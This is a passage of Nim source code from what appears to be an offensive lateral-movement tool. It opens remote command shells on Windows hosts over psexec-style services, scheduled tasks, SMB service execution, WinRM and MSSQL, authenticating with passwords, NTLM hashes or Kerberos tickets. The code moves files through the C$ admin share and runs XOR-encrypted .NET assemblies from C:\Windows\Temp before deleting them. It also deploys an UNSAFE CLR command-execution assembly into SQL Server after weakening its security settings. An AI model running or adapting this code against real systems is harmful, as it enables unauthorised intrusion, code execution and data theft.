          ntlmHash: config.ntlmHash, domain: config.domain,
          ccache: config.ccachePath))
      if session == nil or not session.authenticated:
        stderr.writeLine red("error: ") & (if session == nil: "no session" else: session.message)
        return
      let treeId = waitFor session.connectShareTree("C$")
      if treeId == 0:
        stderr.writeLine red("error: ") & "could not mount share \\\\" & host & "\\C$"
        return
      let baseRemoteShare = windowsPathToSharePath(baseRemoteAbs)
      if not waitFor smbtransfer.ensureRemoteDirOnTree(session, treeId, baseRemoteShare):
        stderr.writeLine red("error: ") & "could not create remote directory " & baseRemoteAbs
        asyncnet.close(session.ctx.socket)
        return
      let collected = collectLocalFiles(rootAbs)
      var doneBytes = 0
      for path in collected.files:
        let rel = relativePath(absolutePath(path), rootAbs)
        let relRemote = rel.replace('/', '\\')
        let remoteFileAbs = if relRemote.len > 0: baseRemoteAbs & "\\" & relRemote else: baseRemoteAbs
        let parent = remoteParent(remoteFileAbs)
        if parent.len > 0 and not waitFor smbtransfer.ensureRemoteDirOnTree(session, treeId,
            windowsPathToSharePath(parent)):
          stderr.writeLine red("error: ") & "could not create remote directory " & parent
          asyncnet.close(session.ctx.socket)
          return
        let progress = makeProgressReporter("upload", path, remoteFileAbs)
        let r = waitFor smbtransfer.putFileOnTree(session, treeId, "C$",
          windowsPathToSharePath(remoteFileAbs), path, progress)
        if not r.success:
          stderr.writeLine red("error: ") & (if r.error.len > 0: r.error else: r.message)
          asyncnet.close(session.ctx.socket)
          return
        doneBytes += r.bytes
      asyncnet.close(session.ctx.socket)
      stderr.writeLine green("uploaded " & $doneBytes & " bytes")

    proc downloadDirRecursive(remoteRoot, localRoot: string) =
      if proto == "mssql":
        downloadDirViaCommand(remoteRoot, localRoot)
        return
      let remoteBase = transferRemotePath(remoteRoot)
      if remoteBase.len == 0:
        stderr.writeLine red("error: ") & "remote path must be on C: and must not be empty"
        return
      let session = waitFor smbclient.establishSmbSession(host, SmbPort,
        max(config.timeoutMs, 5000),
        smbclient.SmbCredential(
          username: config.username, password: config.password,
          ntlmHash: config.ntlmHash, domain: config.domain,
          ccache: config.ccachePath))
      if session == nil or not session.authenticated:
        stderr.writeLine red("error: ") & (if session == nil: "no session" else: session.message)
        return
      let treeId = waitFor session.connectShareTree("C$")
      if treeId == 0:
        stderr.writeLine red("error: ") & "could not mount share \\\\" & host & "\\C$"
        asyncnet.close(session.ctx.socket)
        return
      proc collectRemote(path: string; localBase: string; files: var seq[tuple[remotePath, localPath: string; size: int]]) =
        let listing = waitFor smbclient.listShareDirectory(session, "C$", path)
        for e in listing.entries:
          let childRemote = if path.len > 0: path & "\\" & e.name else: e.name
          let childLocal = if localBase.len > 0: joinPath(localBase, e.name) else: e.name
          if e.isDirectory:
            collectRemote(childRemote, childLocal, files)
          else:
            files.add (remotePath: childRemote, localPath: childLocal, size: int(e.size))
      var files: seq[tuple[remotePath, localPath: string; size: int]]
      collectRemote(remoteBase, localRoot, files)
      var doneBytes = 0
      for item in files:
        let parent = parentDir(item.localPath)
        if parent.len > 0:
          createDir(parent)
        let progress = makeProgressReporter("download", item.localPath, item.remotePath)
        let r = waitFor smbtransfer.getFileOnTree(session, treeId,
          "C$", item.remotePath, item.localPath, progress)
        if not r.success:
          stderr.writeLine red("error: ") & (if r.error.len > 0: r.error else: r.message)
          asyncnet.close(session.ctx.socket)
          return
        doneBytes += r.bytes
      asyncnet.close(session.ctx.socket)
      stderr.writeLine green("downloaded " & $doneBytes & " bytes")

    proc shellUpload(localPath, remoteSpec: string): tuple[output, err: string] =
      if localPath.len == 0:
        result.err = "usage: upload <local> [remote]"
        return
      if not fileExists(localPath):
        result.err = "local file not found: " & localPath
        return
      let remoteAbs =
        if remoteSpec.len > 0: resolveWindowsPath(remoteSpec)
        else: resolveWindowsPath(extractFilename(localPath))
      if remoteAbs.len == 0:
        result.err = "remote path must not be empty"
        return
      if proto == "mssql":
        let direct = shellUploadViaCommand(localPath, remoteAbs)
        if direct.err.len == 0:
          result.output = direct.output
          return
        var smbMessage = ""
        if remoteAbs.len >= 2 and remoteAbs[1] == ':' and remoteAbs[0] in {'c', 'C'}:
          let remotePath = windowsPathToSharePath(remoteAbs)
          let progress = makeProgressReporter("upload", localPath, remoteAbs)
          let r = waitFor smbtransfer.putFile(host, SmbPort,
            max(config.timeoutMs, 5000),
            config.username, config.password, config.ntlmHash, config.domain,
            "C$", remotePath, localPath, progress,
            if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
            config.ccachePath)
          if r.success:
            let seen = shellRemoteFileSize(remoteAbs)
            if seen == r.bytes:
              result.output = "command-channel upload failed (" & direct.err &
                "); uploaded " & $r.bytes & " bytes to " & remoteAbs & " via SMB"
              return
            smbMessage = "SMB upload reported " & $r.bytes &
              " bytes but shell sees " & $seen & " bytes at " & remoteAbs
          else:
            smbMessage = if r.error.len > 0: r.error else: r.message
        if smbMessage.len > 0:
          result.err = "command-channel upload failed (" & direct.err &
            "); SMB upload failed (" & smbMessage & ")"
        else:
          result.err = direct.err
        return
      var smbMessage = ""
      if remoteAbs.len >= 2 and remoteAbs[1] == ':' and remoteAbs[0] in {'c', 'C'}:
        let remotePath = windowsPathToSharePath(remoteAbs)
        let progress = makeProgressReporter("upload", localPath, remoteAbs)
        let r = waitFor smbtransfer.putFile(host, SmbPort,
          max(config.timeoutMs, 5000),
          config.username, config.password, config.ntlmHash, config.domain,
          "C$", remotePath, localPath, progress,
          if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
          config.ccachePath)
        if r.success:
          result.output = " uploaded " & $r.bytes & " bytes to " & remoteAbs
          return
        smbMessage = if r.error.len > 0: r.error else: r.message
      let fallback = shellUploadViaCommand(localPath, remoteAbs)
      if fallback.err.len > 0:
        if smbMessage.len > 0:
          result.err = "SMB upload failed (" & smbMessage & "); command-channel upload failed (" &
            fallback.err & ")"
        else:
          result.err = fallback.err
        return
      if smbMessage.len > 0:
        result.output = "SMB upload failed (" & smbMessage & "); " & fallback.output.strip()
      else:
        result.output = fallback.output

    proc shellExecuteAssembly(localPath: string; asmArgs: seq[string]): tuple[output, err: string] =
      if proto == "mssql":
        result.err = "execute-assembly is not supported over xp_cmdshell (use scm, tsch, cim, mmc, or winrm)"
        return
      if localPath.len == 0:
        result.err = "usage: execute-assembly <local> [args...]"
        return
      if not fileExists(localPath):
        result.err = "local file not found: " & localPath
        return
      let asmBytes =
        try: readFile(localPath)
        except CatchableError as e:
          result.err = "cannot read assembly: " & e.msg; return
      let runner =
        try: psexecmod.buildRunnerBinary()
        except CatchableError as e:
          result.err = e.msg; return
      var rng = initRand(int(getTime().toUnixFloat() * 1e9))
      var key = newString(32)
      for i in 0 ..< 32:
        key[i] = char(rng.rand(255))
      var keyHex = ""
      for b in key:
        keyHex.add b.uint8.toHex(2).toLowerAscii()
      var encBytes = newString(asmBytes.len)
      for i in 0 ..< asmBytes.len:
        encBytes[i] = char(uint8(ord(asmBytes[i])) xor uint8(ord(key[i mod 32])))
      let token  = psexecmod.randomToken()
      let token2 = psexecmod.randomToken()
      let exePath  = "C:\\Windows\\Temp\\ne" & token  & ".exe"
      let blobPath = "C:\\Windows\\Temp\\ne" & token2 & ".dat"
      cleanupPaths.add exePath
      cleanupPaths.add blobPath
      let buildProgress = makeProgressReporter("compile+upload", localPath, exePath)
      let exeTmp = getTempDir() / "nimuxasm_upload.exe"
      writeFile(exeTmp, runner)
      let exeRes = waitFor smbtransfer.putFile(host, SmbPort,
        max(config.timeoutMs, 5000),
        config.username, config.password, config.ntlmHash, config.domain,
        "C$", windowsPathToSharePath(exePath), exeTmp, buildProgress,
        if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        config.ccachePath)
      removeFile(exeTmp)
      if not exeRes.success:
        result.err = "runner upload failed: " & (if exeRes.error.len > 0: exeRes.error else: exeRes.message)
        return
      let blobTmp = getTempDir() / "nimuxasm_blob.dat"
      writeFile(blobTmp, encBytes)
      let blobProgress = makeProgressReporter("upload", localPath, blobPath)
      let blobRes = waitFor smbtransfer.putFile(host, SmbPort,
        max(config.timeoutMs, 5000),
        config.username, config.password, config.ntlmHash, config.domain,
        "C$", windowsPathToSharePath(blobPath), blobTmp, blobProgress,
        if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        config.ccachePath)
      removeFile(blobTmp)
      if not blobRes.success:
        result.err = if blobRes.error.len > 0: blobRes.error else: blobRes.message
        return
      var invokeCmd = exePath & " " & keyHex & " " & blobPath
      for arg in asmArgs:
        if ' ' in arg: invokeCmd.add " \"" & arg & "\""
        else: invokeCmd.add " " & arg
      var r: tuple[output, err: string]
      for attempt in 0 ..< 12:
        if gShellCtrlC: break
        r = runRemote(invokeCmd)
        if "being used by another process" notin (r.output & r.err):
          break
        waitFor sleepAsync(2000)
      discard runRemote("cmd /Q /C del /F /Q \"" & exePath & "\" \"" & blobPath & "\" 2>nul")
      cleanupPaths.keepItIf(it != exePath and it != blobPath)
      if r.output.len > 0:
        result.output = cleanAssemblyOutput(r.output)
      if r.err.len > 0:
        result.err = r.err
      if result.output.len == 0 and result.err.len == 0:
        result.output = "no output from assembly"

    proc shellDownload(remoteSpec, localPath: string): tuple[output, err: string] =
      if remoteSpec.len == 0:
        result.err = "usage: download <remote> [local]"
        return
      let remotePath = transferRemotePath(remoteSpec)
      if remotePath.len == 0:
        result.err = "remote path must be on C: and must not be empty"
        return
      let targetLocal =
        resolveLocalTarget(localPath, remotePath)
      if targetLocal.len == 0:
        result.err = "local path must not be empty"
        return
      if proto == "mssql":
        let direct = shellDownloadViaCommand(resolveWindowsPath(remoteSpec), targetLocal)
        if direct.err.len == 0:
          result.output = direct.output
          return
        let progress = makeProgressReporter("download", targetLocal, remotePath)
        let r = waitFor smbtransfer.getFile(host, SmbPort,
          max(config.timeoutMs, 5000),
          config.username, config.password, config.ntlmHash, config.domain,
          "C$", remotePath, targetLocal, progress,
          if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
          config.ccachePath)
        if not r.success:
          result.err = "command-channel download failed (" & direct.err &
            "); SMB download failed (" &
            (if r.error.len > 0: r.error else: r.message) & ")"
          return
        result.output = "command-channel download failed (" & direct.err &
          "); downloaded " & $r.bytes & " bytes to " & targetLocal & " via SMB"
        return
      let progress = makeProgressReporter("download", targetLocal, remotePath)
      let r = waitFor smbtransfer.getFile(host, SmbPort,
        max(config.timeoutMs, 5000),
        config.username, config.password, config.ntlmHash, config.domain,
        "C$", remotePath, targetLocal, progress,
        if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        config.ccachePath)
      if not r.success:
        result.err = if r.error.len > 0: r.error else: r.message
        return
      result.output = " downloaded " & $r.bytes & " bytes to " & targetLocal

    while true:
      if gShellCtrlC:
        doCleanup()
        break
      let cwdDisplay = if cwd.len > 0: cwd else: "?"
      let prompt = gray("[") & bold(proto) & gray("@") & brightCyan(host) &
        gray(" ") & cwdDisplay & gray("]# ")
      var line: string
      try:
        line = readlineWithHistory(prompt)
      except EOFError:
        doCleanup()
        break
      let cmd = line.strip()
      if cmd.len == 0: continue
      if cmd.toLowerAscii() in ["help", "/help", "?"]:
        showShellHelp()
        continue
      if cmd in ["exit", "quit"]:
        doCleanup()
        break
      let parts = parseCmdLine(cmd)
      if parts.len >= 1 and parts[0].toLowerAscii() == "upload-dir":
        let localDir = if parts.len >= 2: parts[1] else: ""
        let remoteSpec = if parts.len >= 3: parts[2] else: ""
        uploadDirRecursive(localDir, remoteSpec)
        continue
      if parts.len >= 1 and parts[0].toLowerAscii() == "download-dir":
        let remoteSpec = if parts.len >= 2: parts[1] else: ""
        let localDir = if parts.len >= 3: parts[2] else: ""
        let targetLocal =
          if localDir.len > 0: localDir
          else: portableBaseName(transferRemotePath(remoteSpec))
        downloadDirRecursive(remoteSpec, targetLocal)
        continue
      if parts.len >= 1 and parts[0].toLowerAscii() == "upload":
        let localPath = if parts.len >= 2: parts[1] else: ""
        let remoteSpec = if parts.len >= 3: parts[2] else: ""
        let r = shellUpload(localPath, remoteSpec)
        if r.output.len > 0:
          stdout.write r.output
          if not r.output.endsWith("\n"): stdout.write "\n"
          flushFile(stdout)
        if r.err.len > 0:
          stderr.write "\n"
          stderr.writeLine red("error: ") & r.err
        continue
      if parts.len >= 1 and parts[0].toLowerAscii() == "download":
        let remoteSpec = if parts.len >= 2: parts[1] else: ""
        let localPath = if parts.len >= 3: parts[2] else: ""
        let r = shellDownload(remoteSpec, localPath)
        if r.output.len > 0:
          stdout.write r.output
          if not r.output.endsWith("\n"): stdout.write "\n"
          flushFile(stdout)
        if r.err.len > 0:
          stderr.writeLine red("error: ") & r.err
        continue
      if parts.len >= 1 and parts[0].toLowerAscii() == "execute-assembly":
        let localPath = if parts.len >= 2: parts[1] else: ""
        let asmArgs =
          if parts.len > 2: parts[2 .. ^1]
          else: @[]
        let r = shellExecuteAssembly(localPath, asmArgs)
        if r.output.len > 0:
          stdout.write r.output
          if not r.output.endsWith("\n"): stdout.write "\n"
          flushFile(stdout)
        if r.err.len > 0:
          stderr.writeLine red("error: ") & r.err
        continue
      if parts.len >= 1 and parts[0].toLowerAscii() == "cd" and shellUsesWindowsPaths():
        let arg = if parts.len >= 2: parts[1].strip() else: ""
        if arg.len == 0:
          stderr.writeLine cwd
          continue
        let newPath =
          if arg.len >= 2 and arg[1] == ':': arg
          elif arg[0] == '\\': (if cwd.len >= 2: cwd[0..1] else: "") & arg
          else: cwd.strip(chars={'\\'},leading=false) & "\\" & arg
        let r = runRemote("cd /d \"" & newPath & "\" && cd")
        let trimmed = r.output.strip()
        if r.err.len > 0: stderr.writeLine red("error: ") & r.err
        elif trimmed.len > 0: cwd = trimmed
        continue
      let r = runRemote(cmd)
      if r.output.len > 0:
        stdout.write r.output
        if not r.output.endsWith("\n"): stdout.write "\n"
        flushFile(stdout)
      if r.err.len > 0:
        stderr.writeLine red("error: ") & r.err

  if proto == "bin":
    stderr.writeLine dim("starting service...")
    let ps = waitFor psexecmod.openPsExecSession(host, config.port,
      max(config.timeoutMs, 15000),
      config.username, config.password, config.ntlmHash, config.domain,
      authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
      ccache = config.ccachePath)
    if not ps.ready:
      stderr.writeLine red("error: ") & ps.message
      return
    shellLoop(
      proc(): string = "C:\\Windows\\system32",
      proc(cmd: string): tuple[output, err: string] =
        let r = waitFor psexecmod.runPsExecShellCommand(ps, cmd)
        result.output = r.output
        if r.err.len > 0:
          result.err = r.err
        elif r.exitCode != 0 and r.output.len == 0:
          result.err = "exit code " & $r.exitCode
    )
    stderr.writeLine dim("cleaning up...")
    waitFor psexecmod.closePsExecSession(ps)
    return

  if proto == "winrm":
    stderr.writeLine gray("[") & bold(proto) & gray("] ") &
      brightCyan(host & ":" & $config.port) & "  " & dim(principal)
    stderr.writeLine dim("type 'exit' to quit")
    let oldCc = if existsEnv("KRB5CCNAME"): getEnv("KRB5CCNAME") else: ""
    let hadCc = existsEnv("KRB5CCNAME")
    let oldCfg = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
    let hadCfg = existsEnv("KRB5_CONFIG")
    proc sessionRun(cmd: string; isCmd = false): tuple[output, err: string] =
      let r = winrmclient.runWinRmCommand(
        host, config.port,
        config.username, config.password, config.ntlmHash, config.domain,
        cmd, config.useSsl,
        if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
        ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
        spnOverride = config.ldapSpn)
      result.output = r.output
      if not r.success: result.err = r.message
    proc sessionUpload(localPath, remoteSpec, cwd: string): tuple[output, err: string] =
      result = winrmUpload(localPath, remoteSpec, cwd)
    proc cmdQuoteArg(arg: string): string =
      "\"" & arg.replace("\"", "\\\"") & "\""
    proc sessionExecuteAssembly(localPath: string; asmArgs: seq[string]): tuple[output, err: string] =
      if localPath.len == 0:
        result.err = "usage: execute-assembly <local> [args...]"
        return
      if not fileExists(localPath):
        result.err = "local file not found: " & localPath
        return
      let r = winrmclient.executeAssembly(
        host, config.port,
        config.username, config.password, config.ntlmHash, config.domain,
        localPath, asmArgs, config.useSsl,
        if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
        ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
        spnOverride = config.ldapSpn)
      result.output = r.output
      if not r.success: result.err = r.message
    var cwd = sessionRun("(Get-Location).Path").output.strip()
    if cwd.len == 0:
      let profileUser = if config.username.len > 0: config.username.split('\\')[^1] else: "Public"
      cwd = "C:\\Users\\" & profileUser
    try:
      initReadline()
      while true:
        let prompt = gray("[") & bold(proto) & gray("@") & brightCyan(host) &
          gray(" ") & cwd & gray("]# ")
        var line: string
        try:
          line = readlineWithHistory(prompt)
        except EOFError:
          break
        let cmd = line.strip()
        if cmd.len == 0: continue
        if cmd.toLowerAscii() in ["help", "/help", "?"]:
          showShellHelp()
          continue
        if cmd in ["exit", "quit"]: break
        let parts = parseCmdLine(cmd)
        if parts.len >= 1 and parts[0].toLowerAscii() == "upload-dir":
          let localDir = if parts.len >= 2: parts[1] else: ""
          let remoteSpec = if parts.len >= 3: parts[2] else: ""
          if not dirExists(localDir):
            stderr.writeLine red("error: ") & "local directory not found: " & localDir
            continue
          let remoteBase =
            if remoteSpec.len > 0: winrmResolvePath(remoteSpec, cwd)
            else: winrmResolvePath(extractFilename(localDir), cwd)
          let collected = collectLocalRecursiveFiles(localDir)
          var doneBytes = 0
          for item in collected:
            let remotePath = if item.relPath.len > 0: remoteBase & "\\" & item.relPath else: remoteBase
            let r = sessionUpload(item.path, remotePath, cwd)
            if r.err.len > 0:
              stderr.writeLine red("error: ") & r.err
              break
            doneBytes += getFileSize(item.path).int
          stderr.writeLine green("uploaded " & $doneBytes & " bytes")
          continue
        if parts.len >= 1 and parts[0].toLowerAscii() == "download-dir":
          let remoteSpec = if parts.len >= 2: parts[1] else: ""
          let localDir =
            if parts.len >= 3: parts[2]
            else: portableBaseName(winrmResolvePath(remoteSpec, cwd))
          let remoteBase = winrmResolvePath(remoteSpec, cwd)
          if remoteBase.len == 0:
            stderr.writeLine red("error: ") & "remote path must not be empty"
            continue
          let listCmd =
            "$root=" & winrmQuotePath(remoteBase) & "; " &
            "if(-not (Test-Path -LiteralPath $root)){Write-Output '__NIMUX_MISSING__'; exit}; " &
            "Get-ChildItem -LiteralPath $root -File -Recurse | ForEach-Object { $_.FullName + \"`t\" + $_.Length }"
          let listed = sessionRun("Set-Location -LiteralPath " & winrmQuotePath(cwd) & "; " & listCmd)
          if listed.err.len > 0:
            stderr.writeLine red("error: ") & listed.err
            continue
          if "__NIMUX_MISSING__" in listed.output:
            stderr.writeLine red("error: ") & "remote directory not found: " & remoteBase
            continue
          var doneBytes = 0
          for line in listed.output.splitLines():
            let tab = line.rfind('\t')
            if tab <= 0: continue
            let remotePath = line[0 ..< tab]
            var size = 0
            try: size = parseInt(line[tab + 1 .. ^1].strip()) except ValueError: discard
            var rel = remotePath
            if rel.toLowerAscii().startsWith(remoteBase.toLowerAscii()):
              rel = rel[remoteBase.len .. ^1].strip(chars={'\\', '/'})
            let localPath = joinPath(localDir, rel.replace('\\', '/'))
            let r = winrmDownload(remotePath, localPath, cwd)
            if r.err.len > 0:
              stderr.writeLine red("error: ") & r.err
              break
            doneBytes += size
          stderr.writeLine green("downloaded " & $doneBytes & " bytes")
          continue
        if parts.len >= 1 and parts[0].toLowerAscii() == "upload":
          let localPath = if parts.len >= 2: parts[1] else: ""
          let remoteSpec = if parts.len >= 3: parts[2] else: ""
          let r = sessionUpload(localPath, remoteSpec, cwd)
          if r.output.len > 0:
            stdout.write r.output
            if not r.output.endsWith("\n"): stdout.write "\n"
            flushFile(stdout)
          if r.err.len > 0: stderr.writeLine red("error: ") & r.err
          continue
        if parts.len >= 1 and parts[0].toLowerAscii() == "download":
          let remoteSpec = if parts.len >= 2: parts[1] else: ""
          let localPath = if parts.len >= 3: parts[2] else: ""
          let r = winrmDownload(remoteSpec, localPath, cwd)
          if r.output.len > 0:
            stdout.write r.output
            if not r.output.endsWith("\n"): stdout.write "\n"
            flushFile(stdout)
          if r.err.len > 0: stderr.writeLine red("error: ") & r.err
          continue
        if parts.len >= 1 and parts[0].toLowerAscii() == "execute-assembly":
          let localPath = if parts.len >= 2: parts[1] else: ""
          let asmArgs =
            if parts.len > 2: parts[2 .. ^1]
            else: @[]
          if localPath.len == 0:
            stderr.writeLine red("error: ") & "usage: execute-assembly <local> [args...]"
            continue
          if not fileExists(localPath):
            stderr.writeLine red("error: ") & "local file not found: " & localPath
            continue
          let r = sessionExecuteAssembly(localPath, asmArgs)
          if r.output.len > 0:
            stdout.write r.output
            if not r.output.endsWith("\n"): stdout.write "\n"
            flushFile(stdout)
          if r.err.len > 0:
            stderr.writeLine red("error: ") & r.err
          continue
        if parts.len >= 1 and parts[0].toLowerAscii() == "cd":
          let arg = if parts.len >= 2: parts[1].strip() else: ""
          let target =
            if arg.len == 0: cwd
            else: winrmResolvePath(arg, cwd)
          let r = sessionRun("Set-Location -LiteralPath " & winrmQuotePath(target) & "; (Get-Location).Path")
          let trimmed = r.output.strip()
          if r.err.len > 0:
            stderr.writeLine red("error: ") & r.err
          elif trimmed.len > 0:
            cwd = trimmed
          continue
        let r = sessionRun("Set-Location -LiteralPath " & winrmQuotePath(cwd) & "; " & cmd)
        if r.output.len > 0:
          stdout.write r.output
          if not r.output.endsWith("\n"): stdout.write "\n"
          flushFile(stdout)
        if r.err.len > 0:
          stderr.writeLine red("error: ") & r.err
    finally:
      if hadCc: putEnv("KRB5CCNAME", oldCc) else: delEnv("KRB5CCNAME")
      if hadCfg: putEnv("KRB5_CONFIG", oldCfg) else: delEnv("KRB5_CONFIG")
    return

  if proto == "tsch":
    let at = waitFor atexecmod.openAtExecSession(host, config.port,
      max(config.timeoutMs, 8000),
      config.username, config.password, config.ntlmHash, config.domain,
      authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
      ccache = config.ccachePath)
    if not at.ready:
      stderr.writeLine gray("[") & bold(proto) & gray("] ") &
        brightCyan(host & ":" & $config.port) & "  " & dim(principal)
      stderr.writeLine red("error: ") & at.message
      return
    shellLoop(
      proc(): string = "C:\\Windows\\system32",
      proc(cmd: string): tuple[output, err: string] =
        waitFor atexecmod.runAtExecShellCommand(at, cmd)
    )
    atexecmod.closeAtExecSession(at)
    return

  if proto == "scm":
    let se = waitFor smbexecmod.openSmbExecSession(host, config.port,
      max(config.timeoutMs, 8000),
      config.username, config.password, config.ntlmHash, config.domain,
      authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
      ccache = config.ccachePath)
    if not se.ready:
      stderr.writeLine gray("[") & bold(proto) & gray("] ") &
        brightCyan(host & ":" & $config.port) & "  " & dim(principal)
      stderr.writeLine red("error: ") & se.message
      return
    shellLoop(
      proc(): string = "C:\\Windows\\system32",
      proc(cmd: string): tuple[output, err: string] =
        waitFor smbexecmod.runSmbExecShellCommand(se, cmd)
    )
    waitFor smbexecmod.closeSmbExecSession(se)
    return

  var initCwd = execCmd("cd")
  if proto == "mssql" and config.mssqlLinkServer.len > 0 and
      initCwd.output.strip().len == 0 and initCwd.err.len == 0:
    let altCwd = execCmd("pwd")
    if altCwd.output.strip().len > 0 or altCwd.err.len > 0:
      initCwd = altCwd
  if initCwd.err.len > 0:
    stderr.writeLine gray("[") & bold(proto) & gray("] ") &
      brightCyan(host & ":" & $config.port) & "  " & dim(principal)
    stderr.writeLine red("error: ") & initCwd.err
    return
  shellLoop(
    proc(): string =
      let trimmed = initCwd.output.strip()
      if trimmed.len > 0: trimmed else: "C:\\Windows\\system32",
    proc(cmd: string): tuple[output, err: string] = execCmd(cmd)
  )

type MsSqlCliState = object
  loginName: string
  dbUser: string
  databaseName: string
  linkedServer: string
  impersonatedLogin: string
  clrDeployedOn: seq[string]

proc mssqlEscapeString(value: string): string =
  value.replace("'", "''")

proc mssqlStripOuterQuotes(value: string): string =
  let trimmed = value.strip()
  if trimmed.len >= 2 and
      ((trimmed[0] == '"' and trimmed[^1] == '"') or
       (trimmed[0] == '\'' and trimmed[^1] == '\'')):
    trimmed[1 .. ^2]
  else:
    trimmed

proc mssqlLooksLikeSql(value: string): bool =
  let trimmed = value.strip()
  if trimmed.len == 0:
    return false
  let lower = trimmed.toLowerAscii()
  for prefix in [
    "select ", "with ", "exec ", "execute ", "insert ", "update ",
    "delete ", "merge ", "use ", "declare ", "if ", "begin ", "create ",
    "alter ", "drop ", "truncate ", "grant ", "revoke ", "deny ",
    "backup ", "restore ", "dbcc ", "waitfor ", "set ", "print "
  ]:
    if lower.startsWith(prefix):
      return true
  if trimmed[0] == '(':
    return true
  false

proc mssqlClrBytesToHex(data: string): string =
  result = newStringOfCap(data.len * 2)
  const hex = "0123456789ABCDEF"
  for b in data:
    let n = ord(b)
    result.add hex[n shr 4]
    result.add hex[n and 0xf]

proc mssqlCompileClrExec(): tuple[hex, err: string] =
  let tmp = getTempDir() / "nimux_clr"
  try:
    createDir(tmp)
    writeFile(tmp / "Nimux.cs",
      "using System; using System.Runtime.InteropServices; using System.Text;\n" &
      "public class Nimux {\n" &
      "    [DllImport(\"libc\", EntryPoint=\"popen\", CharSet=CharSet.Ansi)] static extern IntPtr lnx_popen(string cmd, string mode);\n" &
      "    [DllImport(\"libc\", EntryPoint=\"fread\")] static extern IntPtr lnx_fread(byte[] buf, IntPtr sz, IntPtr n, IntPtr fp);\n" &
      "    [DllImport(\"libc\", EntryPoint=\"pclose\")] static extern int lnx_pclose(IntPtr fp);\n" &
      "    [DllImport(\"msvcrt\", EntryPoint=\"_popen\", CharSet=CharSet.Ansi)] static extern IntPtr win_popen(string cmd, string mode);\n" &
      "    [DllImport(\"msvcrt\", EntryPoint=\"fread\")] static extern IntPtr win_fread(byte[] buf, IntPtr sz, IntPtr n, IntPtr fp);\n" &
      "    [DllImport(\"msvcrt\", EntryPoint=\"_pclose\")] static extern int win_pclose(IntPtr fp);\n" &
      "    public static string Exec(string cmd) {\n" &
      "        bool lnx = Environment.OSVersion.Platform == PlatformID.Unix;\n" &
      "        var sb = new StringBuilder(); var buf = new byte[4096];\n" &
      "        IntPtr fp = lnx ? lnx_popen(cmd + \" 2>&1\", \"r\") : win_popen(cmd + \" 2>&1\", \"r\");\n" &
      "        if (fp == IntPtr.Zero) return \"popen failed\";\n" &
      "        long n;\n" &
      "        while ((n = (long)(lnx ? lnx_fread(buf,(IntPtr)1,(IntPtr)4096,fp) : win_fread(buf,(IntPtr)1,(IntPtr)4096,fp))) > 0)\n" &
      "            sb.Append(Encoding.UTF8.GetString(buf, 0, (int)n));\n" &
      "        if (lnx) lnx_pclose(fp); else win_pclose(fp);\n" &
      "        return sb.ToString();\n" &
      "    }\n}\n")
    let dllOut = tmp / "Nimux.dll"
    let mcs = execCmdEx("mcs -target:library -out:\"" & dllOut & "\" \"" & tmp / "Nimux.cs" & "\" 2>&1")
    if mcs.exitCode == 0 and fileExists(dllOut):
      return (mssqlClrBytesToHex(readFile(dllOut)), "")
    writeFile(tmp / "Nimux.csproj",
      "<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup>" &
      "<TargetFramework>netstandard2.0</TargetFramework>" &
      "<AssemblyName>Nimux</AssemblyName></PropertyGroup></Project>")
    let outDir = tmp / "out"
    let dn = execCmdEx("dotnet build \"" & tmp & "\" -o \"" & outDir & "\" -c Release 2>&1")
    let outDll = outDir / "Nimux.dll"
    if dn.exitCode == 0 and fileExists(outDll):
      return (mssqlClrBytesToHex(readFile(outDll)), "")
    return ("", "no C# compiler found - install Mono: apt-get install mono-mcs")
  except CatchableError as e:
    return ("", e.msg)

proc mssqlClrDeploySqls(dllHex: string): seq[string] =
  result.add "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; " &
             "EXEC sp_configure 'clr enabled', 1; RECONFIGURE; " &
             "EXEC sp_configure 'clr strict security', 0; RECONFIGURE; " &
             "ALTER DATABASE master SET TRUSTWORTHY ON;"
  result.add "IF EXISTS (SELECT 1 FROM sys.objects WHERE name = 'nimux_clr') DROP FUNCTION dbo.nimux_clr; " &
             "IF EXISTS (SELECT 1 FROM sys.assemblies WHERE name = 'NimuxClr') DROP ASSEMBLY NimuxClr; " &
             "DECLARE @h VARBINARY(64) = HASHBYTES('SHA2_512', 0x" & dllHex & "); " &
             "IF NOT EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = @h) " &
             "  EXEC sys.sp_add_trusted_assembly @h, N'NimuxClr,version=0.0.0.0,culture=neutral,publickeytoken=null,processorarchitecture=msil'; " &
             "CREATE ASSEMBLY NimuxClr FROM 0x" & dllHex & " WITH PERMISSION_SET = UNSAFE;"
  result.add "CREATE FUNCTION dbo.nimux_clr(@cmd nvarchar(4000)) RETURNS nvarchar(max) " &
             "EXTERNAL NAME NimuxClr.[Nimux].[Exec];"

proc mssqlOleSql(cmd: string): string =
  let escaped = mssqlEscapeString(cmd)
  "DECLARE @cmd NVARCHAR(4000), @iswin BIT;" &
  "SET @cmd = N'" & escaped & "';" &
  "SELECT @iswin = CASE WHEN @@VERSION LIKE N'%Windows%' THEN 1 ELSE 0 END;" &
  "IF @iswin = 0 BEGIN" &
  " DECLARE @t TABLE (output NVARCHAR(4000));" &
  " INSERT @t EXEC xp_cmdshell @cmd;" &
  " SELECT output FROM @t WHERE output IS NOT NULL;" &
  "END ELSE BEGIN" &
  " DECLARE @sh INT, @exec INT, @stdout INT, @stderr INT, @out VARCHAR(8000), @err VARCHAR(8000), @run NVARCHAR(4000), @status INT, @hr INT;" &
  " SET @run = 'cmd /Q /C ' + @cmd;" &
  " EXEC @hr = sp_OACreate 'WScript.Shell', @sh OUT;" &
